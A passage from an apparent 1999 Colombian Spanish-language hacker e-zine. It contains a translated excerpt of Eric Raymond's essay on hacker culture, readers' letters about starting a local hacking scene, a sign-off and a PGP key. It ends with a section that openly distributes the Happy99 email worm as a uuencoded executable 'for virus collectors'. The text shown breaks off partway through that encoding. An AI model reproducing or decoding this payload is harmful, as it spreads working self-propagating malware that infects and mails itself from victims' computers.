juguete de hackers que incluso los políticos admiten que está cambiando el 
mundo. Sólo por esta razón (y hay un montón de otras igualmente buenas) Ud. debe 
aprender como trabajar en la Web. 

Esto no significa aprender a manejar un navegador (cualquiera puede hacer eso), 
sino que debe aprender a escribir HTML, el lenguaje de marcas de la Web. Si Ud. 
aún no sabe como programar, el aprendizaje que implica la escritura de HTML le 
enseñará algunos de los hábitos mentales que le ayudarán luego con la 
programación. Así que haga su página personal. 

No crea que por tener una página personal está más cerca de ser un hacker. La 
Web está llena de páginas personales. La mayoría de ellas son sin sentido, 
basura sin contenido -- basura muy vistosa, pero basura al fin (si desea ver más 
sobre este tema mire en The HTML Hell Page).

Para que valga la pena, su página debe tener contenido -- debe ser interesante 
y/o útil para los otros hackers. Y esto nos lleva al próximo tema... 

Status en la Cultura Hacker

De manera similar a muchas otras culturas sin economía monetaria, el hackerismo 
se basa en la reputación. Ud. está intentando resolver problemas interesantes, 
pero cuan interesantes son, y cuan buenas son las soluciones que Ud. encuentre, 
es algo que sólo sus iguales o superiores técnicamente hablando serán capaces de 
juzgar. 

De acuerdo a esto, cuando juega el juego de los hackers, Ud. aprende a puntuarse 
principalmente en función de los que los otros hackers piensan acerca de sus 
habilidades (éste es el motivo por el cual Ud. no puede ser un hacker de verdad 
hasta que otros hackers lo denominen así de manera consistente). Este hecho está 
empañado por la imagen del trabajo de hacker como trabajo solitario; también por 
un tabú cultural de los hackers (si bien en la actualidad es menor, aún es 
fuerte) que impide que se admita al ego o la validación externa como elementos 
involucrados en la propia motivación. 

Específicamente, el hackerismo es lo que los antropólogos denominan cultura de 
la donación. Ud. gana estatus y reputación no mediante la dominación de las 
otras personas, no por ser hermoso/a, ni por tener cosas que las otras personas 
desean, sino por donar cosas. Específicamente, al donar su tiempo, su 
creatividad, y el resultado de sus habilidades. 

Existen básicamente cinco clases de cosas que Ud. puede hacer para obtener el 
respeto de los hackers: 

1. Escribir software libre.

Lo primero (lo más central y más tradicional) es escribir programas que los 
otros hackers opinen son divertidos o útiles, y donar los fuentes del programa a 
la cultura hacker para que sean utilizados. 

Los más reverenciados semidioses del hackerismo son las personas que han escrito 
programas de gran magnitud, con grandes capacidades que satisfacen necesidades 
de largo alcance, y los donan, de tal manera que cualquiera pueda utilizarlos. 

2. Ayudar a probar y depurar software libre

También son reconocidas aquellas personas que depuran los errores del software 
libre. En este mundo imperfecto, inevitablemente pasaremos la mayoría de nuestro 
tiempo de desarrollo en la fase de depuración. Éste es el motivo por el cual los 
desarrolladores de software libre piensan que un buen probador-beta (uno que 
sabe como describir claramente los síntomas, que puede localizar correctamente 
los problemas, que tolera los errores en una entrega apurada, y que está 
dispuesto a aplicar unas cuantas rutinas sencillas de diagnóstico) vale su peso 
en rubíes. Aún contando con un solo probador de éstos puede hacerse que el 
proceso de depuración pase de ser una prolongada pesadilla que lo deja a uno 
exhausto, a ser sólo una saludable molestia. 

Si Ud. es un novato, trate de encontrar un programa en desarrollo en el cual 
esté interesado, y sea un buen probador beta. Hay una progresión natural desde 
ayudar a probar programas, luego ayudar a depurarlos, y más adelante ayudar a 
modificarlos. Aprenderá un montón de esa manera, y la gente lo ayudará a Ud. más 
adelante. 

3. Publicar información útil.

Otra buena cosa que puede hacer es recolectar y filtrar información útil e 
interesante y construir páginas Web, o documentos como PF (Preguntas Frecuentes, 
FAQ en inglés), y ponerlos a disposición de los demás. 

La gente que mantiene las PF (FAQ) técnicas más importantes gozan de casi tanto 
respeto como los autores de software libre. 

4. Ayudar a mantener en funcionamiento la infraestructura.

La cultura hacker (y el desarrollo ingenieril de la Internet, para el caso) 
funciona gracias al trabajo voluntario. Existe una gran cantidad de trabajo 
necesario pero sin glamour que debe hacerse para que esto siga marchando -- 
administrar listas de correo, moderar foros de discusión, mantener sitios donde 
se archivan grandes cantidades de software, desarrollar RFCs y otros estándares 
técnicos. 

La gente que desarrolla estas actividades goza de mucho respeto, porque todos 
saben que esos trabajos son grandes consumidores de tiempo y no tan divertidos 
como meterse con el código. Los que lo llevan adelante demuestran su dedicación. 

5. Hacer algo por la cultura hacker en sí misma.

Finalmente, Ud. puede servir y propagar la cultura hacker en sí misma (por 
ejemplo, escribiendo un texto acerca de como transformarse en hacker :-)). Esto 
no es algo en lo cual estará en posición de hacer hasta que sea conocido en el 
ambiente por las primeras cuatro cosas. 

La cultura hacker no tiene líderes, exactamente, pero tiene héroes culturales, 
historiadores tribales, y voceros. Cuando Ud. ha estado en las trincheras tiempo 
suficiente, podrá crecer y transformarse en uno de ellos. Pero tenga cuidado: 
los hackers desconfían del ego ruidoso en sus jefes tribales, así que la 
búsqueda visible de esa clase de fama es peligrosa. En lugar de esforzarse por 
ella, debe colocarse en una posición tal que ella caiga sobre Ud., y luego debe 
comportarse de manera modesta y con gracia con su estatus. 

La conexión Hacker/Nerd

Contrariamente al mito popular, no es necesario que sea un nerd para ser un 
hacker. Ayuda, sin embargo, y muchos hackers son nerds. Al ser un marginado 
social, el nerd puede mantenerse concentrdo en las cosas realmente importantes, 
como pensar y hackear. 

Por esta razón, muchos hackers han adoptado la etiqueta `nerd' e incluso 
utilizan el desagradable término `geek' como insignia de orgullo -- es su forma 
de declarar su propia independencia de las expectativas sociales normales. Si 
desea ver una discusión más extensa vea The Geek Page. 

Si Ud. puede vérselas con la concentración suficiente en las tareas de hacker 
para ser bueno en ello, y encima disfrutar de una vida, está bien. Es muchísimo 
más fácil ahora que cuando yo era un novato; la cultura popular ve con mejores 
ojos a los tecno-nerds en la actualidad. Hay además un número creciente de 
personas que se dan cuenta que los hackers frecuentemente son un material de 
alta calidad para novio/novia/marido/esposa. Si desea ver algo más acerca de 
esto, vea la Girl's Guide to Geek Guys. 

Si Ud. se siente atraído por la actividad hacker porque no tiene una vida 
personal, está bien también -- al menos no tendrá problemas de concentración. A 
lo mejor más adelante se puede conseguir una vida como la gente. 

Cuestiones de estilo

De nuevo, para ser un hacker, Ud. debe desarrollar la mentalidad del hacker. 
Existen algunas cosas que Ud. puede hacer cuando está sin computadora, que lo 
pueden ayudar. Estas cosas no son sustituto para la actividad propia de hackear 
(nada lo es) pero muchos hackers las realizan, y sienten que de alguna manera 
primitiva se conectan con la esencia de la actividad de hackear. 

  *  Lea ficción científica. Vaya a las reuniones sobre ficción científica (es 
  un buen método para encontrarse con hackers y proto-hackers)

  *  Estudie Zen,   y/o practique artes marciales. (La disciplina mental se 
  parece en ambos casos.)

  *  Desarrolle un oído analítico para la música. Aprenda a apreciar   música de 
  clases peculiares. Aprenda a tocar correctamente alguna clase de instrumento 
  musical, o a cantar.

  *  Desarrolle inclinación por los dobles sentidos y los juegos de palabras.

  *  Aprenda a escribir correctamente en su lengua nativa. (Una cantidad 
  sorprendente de hackers, incluyendo a los mejores que conozco, son grandes 
  escritores.) 

Cuanto más de estas cosas haya hecho, es más probable que Ud. posea material 
natural para hacker. 

Finalmente, unas pocas cosas que no debe hacer. 

  *  No use un nombre de usuario grandioso y bobo.

  *  No se meta en las discusiones airadas en Usenet (ni en ningún otro lado).

  *  No se autodenomine `cyberpunk', ni desperdicie su tiempo en nadie que lo 
  haga.

  *  No escriba para el correo o los foros con montones de errores de tecleo o 
  construcciones gramaticales incorrectas.

La única reputación que se ganará con esas costumbres es la de un escarnecedor. 
Los hackers tienen una gran memoria -- puede tomarle años hasta que lo acepten 
luego de estas cosas. 

Otras fuentes de información

Puede leer una traducción al japonés de este documento.

El Loginataka nombra alguna de las cosas que hay que decir acerca del 
entrenamiento apropiado y la actitud de un hacker de Unix. 

Además he escrito A Brief History Of Hackerdom. 

Peter Seebach maintiene una excelente Hacker FAQ para administradores que no 
saben como tratar con hackers. 

También he escrito un artículo, The Cathedral and the Bazaar, que explica en 
detalle como trabaja la cultura Linux. Puede encontrarlo en mi página de 
escritos.

Preguntas frecuentes

P: ¿Me enseñaría como hackear?

Desde la primera publicación de esta página, me llegan varios pedidos por semana 
de gente que quiere que le "enseñe todo sobre hackeo". Desafortunadamente, no 
tengo ni el tiempo ni la energía para hacer eso; mis propios proyectos de hackeo 
consumen el 110% de mi tiempo. 

Aún si pudiera hacerlo, el hackeo es una actitud y habilidad que Ud. debe 
aprender por sí mismo. Verá que los hackers de verdad quieren ayudarlo, pero no 
lo respetarán si Ud. comienza a rogarles que lo alimenten en la boca con todo lo 
que saben. 

Aprenda unas cuantas cosas primero. Muéstreles que está intentando, que es capaz 
de aprender por su cuenta. Luego vaya, hable con los hackers y hágales sus 
preguntas. 

P: ¿Dónde puedo encontrar algunos verdaderos hackers para comunicarme con ellos?

Bueno, ciertamente no en IRC, eso es seguro -- allí no hay nada más que 
discutidores y crackers hasta donde la vista alcanza. La mejor manera es 
encontrar un grupo local de usuarios de Unix o Linux y asistir a sus reuniones 
(existe una lista de grupos en la página de Sunsite: Linux Users' Group.

P: ¿Cuál lenguaje debo aprender primero?

HTML, si no lo conoce ya. Existe un montón de malos libros sobre HTML con 
brillantes páginas y con contenidos a la moda. El que más me gusta es HTML: The 
Definitive Guide.

Cuando esté listo para comenzar con programación, le recomiendo que comience con 
Perl o Python. C es realmente importante, pero también mucho más difícil. 

P: ¿Por dónde puedo empezar? ¿Dónde puedo conseguir un Unix libre?

En otras partes de esta página ya incluí enlaces hacia donde obtener Linux. Para 
ser un hacker Ud. necesita motivación, iniciativa y la capacidad para educarse a 
sí mismo. Comience ahora... 

                                  Eric Steven Raymond
                                  http://www.tuxedo.org/~esr/

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
ONCE                                                                      Cartas
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Estas cartas ya fueron contestadas personalmente, pero no está de mas ubicarlas 
por aquí para saber que siempre hay gente apoyando...

----

1.

Fecha:      01/01/99 12:42:10 
De:         endlessroad@xxx.xxx
A:          linterna@xxx.xxx
Asunto:     Saludos - EndlessRoad 

Hola!!

Me agrada el haberme dado cuenta de que al menos hay otra página colombiana de 
Hacking (me sentía un poco raro :-)). He creado un grupo llamado Intrusos, y me 
gustaría que compartiéramos conocimientos. El URL es 
<http://members.tripod.com/endlessroad>, el grupo es de Medellín (al igual que 
el tuyo, creo) y me gustaría que impulsáramos más con una e-zine el movimiento 
Hacking en Colombia. De una u otra manera contrarrestaremos el monopolio del 
hacking en España y en Argentina. Mi homepage está muy incompleta y tiene que 
ser vista con navegadores 4.0 (solo la pude optimizar así... falta de tiempo).

Espero una respuesta.
We're in.

Saludos
endlessroad@netscape.net
http://members.tripod.com/endlessroad

-----

2.

Fecha:      11 Jan 99 21:01PM EST
De:         fantasmadigital@iname.com
A:          mr.silence@usa.net

Hola,

Bacano eso de la lista ... al fin alguien (tan  desparchado ;P) saco el proyecto 
este adelante ... Es bien ... En estos dias me subscribo a la lista ...  Tengo 
que arreglar unas cosas pendientes, y listo ...

Bueno pues,  no siendo más ...

Suerte,

F.D.

PD> "Quisiera un castillo sangriento"

-----

3.

Fecha:      11 Jan 99 00:59AM EST  
De:         "Luis Daniel Angel" <luisda91@xxx.xxx>
A:          mr.silence@usa.net
Asunto:     Re: Mensajes enviados 

Me parece interesante lo querés hacer, y mas aún por que vos estas interesado en 
hacer algo, desde mi punto de vista, grande, y me gusta mucho por que se ve que 
tenés ambición y eso es algo que me parece muy bien, por que gente como vos, es 
la que necesitamos en la red, que quiera formar un grupo para colaborarse entre 
ellos mismos, y enriqueserce intelectualmente, sobretodo en este ámbito como lo 
es todo lo relacionado con informatica y su aprovechamiento!, vos me entendés.

Por lo que he podido notar a vos te interesa mucho el H, y talvez en lo que se 
relacióna con Linux y un poco de Unix te podria colaborar, por el momento hé 
estádo en un poco de reseso, por que estas vacaciones me fui de viaje con mi 
famila, por esa razón no te habia respondido nada. 

Talvez poco a poco se pueda lograr lo que querés, y seria excelente poder llegar 
al punto de tener uno de lo grupos UnderG mas grandes y poderosos de 
latinoamérica!

Yo tengo otro e-mail que es el de la U, pero el servi esta caido, y parece que 
lo van a cambiar, lo mas seguro es que si, por que como yo soy monitor sistemas, 
y algunas veces ayudo al administrador de red, de eso fue de lo que me di cuenta 
antes de vacaciones, chubby@xxx.xxx Si querés me podes seguir llamando Chubby, 
que así es como soy conocido en la red por mis amigos y por varios Cybernautas. 
pero mejor seguíme escribiendo a esta direccion. Por ahora estoy mas que todo 
dedicado a exprimir totalmente mi unidad de lecto-escritura, pero lo que 
necesités solo me tenés que escribir.

Suerte,
      Chubby

-----

4.

Fecha:      10 Jan 99 13:08PM EST
De:         TAkER <u_taker@xxx.xxx>
A:          mr.silence@usa.net
Asunto:     Hey...

Pos ya lei la e-zine... Felicitaciones por haberla sacado, la verdad yo alguna 
vez lo intente, pero no tuve tanta suerte, pues intente formar un grupo y las 
cosas no salieron del todo bien....ahora escribo para Proyecto R y las cosas van 
bien...tenemos muchos proyectos en mente y ahi vamos...

La verdad me alegra que por fin haya alguien que se haya atrevido a sacar una 
e-zine colombiana, tenes mi apoyo completo (si te interesa), no se mucho que 
digamos, pero algo es algo....

Oye, sos de Medellin..???
Si si, pues yo tambien...y parece que pronto (menos de seis meses) habra un 
encuentro under Propiciado por Proyecto R...) despues te cuento el rollo...

Suerte n' phree

TAkER
CDLR

PD: Que verraco pa escribir no..???

-----

5.

Fecha:      17 Jan 99 23:37PM EST
De:         <jcongote@xxx.xxx>
A:          mr.silence@usa.net
Asunto:     RE: Hack & Phreak

Hola viejo, bueno mira tu pagina es bastante buena, sobretodo la idea de una 
pagina de hack colombiano (que segun veo esa es tu idea), bueno espero que 
arregles los links malos, entre ellos la edicion de el e-zine,

quitale todo ese monton de banners y mas bien averiguate quien te da un host 
para esa pagina sin tantas complicaciones, bueno en todo caso animo y en lo que 
te pueda servir too good.

ATTE: PeSa

-----

6.

Fecha:      10 Jan 99 10:20AM EST 
De:         "Arq. Mario A. Lopez" <mlopez@xxx.xxx>
A:          mr.silence@usa.net
Asunto:     Virus en la computer

Hola. 

Tengo un virus en la computer, en el systema de windows precisamente en 
system32.exe, que es el virus gjamer v1 que es un virus trojan.

De que manera lo puedo quitar sin tener que formatear el Hard disk? Hay alguna 
manera? y si la hay, te agradeceria si la pudieras enviar a mlopez@xxx.xxx

Agradesco el tiempo que te tomas para leer este E-mail, Gracias

-----

7.

Fecha:      20 Jan 99 13:54PM EST
De:         EndlessRoad <endlessroad@xxx.xxx>
A:          mr.silence@usa.net
Asunto:     Intrusos Magazine [EndlessRoad]

Hola, 

Begin connection.....(9.600 bps) 

Acaba de salir al aire el primer número de Intrusos Magazine, está disponible en 
la web oficial de Intrusos (ya sabes cual es). 

Espero que me flamees después de que la leas :-) 

Por otro lado sería bueno que creáramos un canal IRC para hackers en Colombia 
(aunque por ahora se mantendría vacío) y así conocer más gente que pueda 
ayudarnos (después de un fuerte examen, no mentiras), también deberíamos 
escribir a las principales revistas en español para anunciarles el comienzo de 
la scene hacking en Colombia...ah y llamar a los  despreocupados administradores 
de sistema para darles un pésame :-) 

Es todo, nos vemos. 

........Conection Terminated 
                                   NO CARRIER

- EndlessRoad 

web oficial: http://intrusos.cjb.net 

-----

8.

Fecha:      22 Feb 99 20:51PM EST 
De:         "YeYo" <yeyo@xxx.xxx>
A:          mr.silence@usa.net
Asunto:     E-Zine TEMPORAL Nº1

Hoy he conseguido vustro ejemplar número uno del E-zine TEMPORAL, y me ha 
gustado ya que por fin de una vez he encontrado unos articulos que empiecen 
desde 0, ya que hace tiempo he intentado conseguir algo así, pero... no he 
podido por el simple hecho de no poderme conectar mucho y por no saber mucho el 
inglés, pero... lo que yo quería saber es si por casualidad habeis seguido con 
esto ya que he visto que el ejemplar era de diciembre del 98.

Bueno... solo era eso y felicitaros porque me ha gustado.

      Un Saludo,

YeYo

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
DOCE                                                                         Fin 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Por fin termina el trasnocho de unos días (que se convirtieron en meses, perdón 
por la demora)... aquí les dejo prometiendo un nuevo temporal pronto, no sé, dos 
meses quizá, a lo mejor menos, todo depende del trabajo y de las ganas de 
trasnochar (y de que no me corten mi conexión a Internet ;D)

Para sugerencias y otras cosas mi casilla de correo como siempre, ya existe un 
boletín semanal en el cual recojo información más ágil y si se dan una pasadita 
por la página encontrarán esa información. http://silence.tsx.org/ o 
http://travel.to/silence

Siento la demora y termino aquí la carreta...

Hasta otra oportunidad a todos...

                                                                     Mr. Silence
                                                              mr.silence@usa.net
                                                                   (otra vez...)

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
TRECE                                                                        Pgp 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Mr. Silence
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com>

mQGiBDZyl3sRBAD49tLlvtvsYKEKL7+dIh86ZM2W1xzd4IkNzPLkE+isf7UohuL6
CzFzVMp/bHqsTdvKlYYtseO1WQFSe8isnOlX//7RJ9SonXTME4EeShscHQTDbq0k
00sGc4XEghEMIs0X0g7uyeg4go8Tx/75FvbVHqCjFnmFQW+6kImO7yu29wCg/8JY
qKsGWL/FGHY3RgrC2rGAIiUD/2tp3AsC3V18RZXoLk3zAJrQIl8yS+Kq/hXcSgvM
XrPnHJbBUh7fn1DEaKx0pzaifQ5BOP3iDyjO9hxbo0B80/Z6uV7MlrVGLc9hQZLA
qFkL43/ZDK41sZ6tCQsFPJfp8lA2Fz1v/8Mk4lYPWYar6esrNXD74bhXwQrGWj+R
btk9A/9r5A3q59BFFLTSMRGGWGIswdo2KczpZPimkfj7BSvkctkQnzhlyJHSARYT
Iv1YnVYgIhxjAy/WzKhbNy8VNRrGj3zgabNhLDPXr7DRX03XQiLRpMNj4jtglXHZ
8YXJsRhCu1wAiH/CaUwwsctJ+xw7qQ4HoNrd7YYZRDwRDg1VMLQgTXIuIHNpbGVu
Y2UgPG1yLnNpbGVuY2VAdXNhLm5ldD6JAEsEEBECAAsFAjZyl3sECwMBAgAKCRC9
dP2/lyfK3RNhAKCKQ94tXKq6wPlx/4aJqifOx3Zu+ACfW03OMHqSz9DmMNyDiWM7
fpyxXqW5Ag0ENnKXexAIAPZCV7cIfwgXcqK61qlC8wXo+VMROU+28W65Szgg2gGn
VqMU6Y9AVfPQB8bLQ6mUrfdMZIZJ+AyDvWXpF9Sh01D49Vlf3HZSTz09jdvOmeFX
klnN/biudE/F/Ha8g8VHMGHOfMlm/xX5u/2RXscBqtNbno2gpXI61Brwv0YAWCvl
9Ij9WE5J280gtJ3kkQc2azNsOA1FHQ98iLMcfFstjvbzySPAQ/ClWxiNjrtVjLhd
ONM0/XwXV0OjHRhs3jMhLLUq/zzhsSlAGBGNfISnCnLWhsQDGcgHKXrKlQzZlp+r
0ApQmwJG0wg9ZqRdQZ+cfL2JSyIZJrqrol7DVekyCzsAAgIH/2ZPJj3ML2lobE92
I33qB0XMnwhuYLDlNxe2XakwZo46RunDkFuWVRjnyjJLZLVDDL34EeE4P11rVzNs
4Rf9odllHMhHmV8vXSbIdYPUTPzSjmkrNPUIHLHDWq/ZgM9FxekjGyA69nMXIoQ3
qqT4VD2Pn9rsnKEb8PO/Ujyhzot+YDglWsVIK96xPHlaVbqXGYKlUl93YLs5WOtN
K+NnaER13+dzJxKcQKTX4bbwEpKLgKKNlReWrGO/dhdQRjufoZ5yDTaOKzSVKn8M
G9AMDMBXYR8eokTc7iHtLuR0qYvQ4XJxr8sX3W11ntDFPdacB776x3o4cscjsGi7
ToFQmi+JAD8DBRg2cpd7vXT9v5cnyt0RAsCCAJ94J4+IuwFJ5+H85HVPNqYT831e
tQCfccH2HAdHbT4UmbMcDzlm24uTUw4=
=mR7J
-----END PGP PUBLIC KEY BLOCK-----

--------------------------------------------------------------------------------

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
CATORCE                                                             Aplicaciones
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Otra vez en UUencode... para aquellos que les gusta coleccionar virus...

El famoso Happy99...

section 1 of uuencode 5.25 of file happy99.exe    by R.E.M.

begin 644 happy99.exe
M35I0``(````$``\`__\``+@`````````0``:````````````````````````
M``````````````````````$``+H0``X?M`G-(;@!3,TAD)!4:&ES('!R;V=R
M86T@;75S="!B92!R=6X@=6YD97(@5VEN,S(-"B0W````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````@U!%``!,`00`GR77C@``
M````````X`".@0L!`AD`"@```!8```````````$````!`````@```$`````!
M```"```!``````````,`"@`````````%```$`````````@``````$```(```
M```0```0````````$``````````````````#`$`#````````````````````
M``````````````````0`:`$`````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````0T]$10``````$``````!```*````!@``````````````````
M(```8$1!5$$``````!```````@``$````!```````````````````$```,`N
M:61A=&$````0``````,```0````@``````````````````!```#`+G)E;&]C
M````$``````$```"````)```````````````````0```4```````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
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
M@_@`#X0!`0``N0`0``"+->L.0@!15E^#QQ2+1@BKBT8,JX$&`!```*T!1@2M
M`48$K<'X$(O0K<'X$(O8K8/X`'4%@\8(ZTF`;OP!<P3&1OP`@&[]`7,$QD;]
M`(!N_@%S!,9&_@!64%)3_S5C#T(`Z/8!``!>K<'X$(O0K<'X$%9J`%)0_S5C
M#T(`Z-L!``!>@\8$64D/A7G_____!5,/0@#I-/___X,]-P]"`!)T%K@S#T(`
M4%#HJ0$``.B&`0``Z17_____-6,/0@#_-8(/0@#H4@$``,<%B@]"`/_____I
M/_[__UBCA@]"`(-\)`0"=0MJ`.@[`0``,\#K!>A*`0``BPV&#T(`4<.A3P]"
M`(/@#Z-/#T(`P>`-BSWK#D(``_BY``$``.AF````P>@(HUL/0@#H60```,'H
M"*-7#T(`Z$P```#!Z`@-#P^O`(O8Z#T```#!Z`^)!XE/!-M'!-G^V@_;1P39
M_]H/VQ_;7P2#QPBA5P]"`*NA6P]"`*N+PZN#QPSBR?\%3P]"`.EW_O__N!-`
M(0#W+5\/0@`KT@41$%,"HU\/0@##_R5D`$,`_R5H`$,`_R5L`$,`_R5P`$,`
M_R5T`$,`_R5X`$,`_R5\`$,`_R6``$,`_R6$`$,`_R6(`$,`_R6,`$,`_R60
M`$,`_R64`$,`_R68`$,`_R6<`$,`_R6@`$,`_R6D`$,`_R6H`$,`_R6P`$,`
M_R6T`$,`_R6X`$,`_R7``$,`_R7$`$,`_R7(`$,`_R7,`$,`_R70`$,`_R74
M`$,`_R78`$,`_R7<`$,`_R7@`$,`_R7D`$,`_R7H`$,`_R7P`$,`````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M`+*EK__]____^__P_P``__]'_________[__Y?]:15)/"````/_^__]%[__Q
MX$OV,MY'_K,RWF]OJY>6C-^/C9"8C9Z2WY**C(O?G9K?C8J1WXJ1FYJ-WZB6
MD<S-\O7;R%I%4D\B````K[K__[/^^O]@VBIQ6D523P(````?_W%>]/[]YO_U
M____]____________O____[____]____O_____[___W___[__________/_U
M__________G___O________]____6D523P(```#__^___^_________O____
M___[_Z________S_D_[__UI%4D\&````___Z_Q/___]:15)/%````+RPN[K_
M_____^_______O__]?____G__UI%4D\#````W___G[N^J[[______^______
M_?___?___^___UI%4D\#````O___/]&6FYZ+GO___^_______/___?___^W_
M_UI%4D\#````O___/]&:FYZ+GO___^______^____?___^O__UI%4D\#````
MO___O]&-FI.0G/___^______^O___?___^G__UI%4D\#````O___KUI%4D_0
M````?(/;]_^+LGR#V_?^B_T4L$'#_[W_J:!&RO___U,)+U4=!9?_W___E;\7
M9_?__WH_BOO,/Q310&;_O?]4^D?T__]4^D?T__]4^A?\__]4?#^;5!3T`,IF
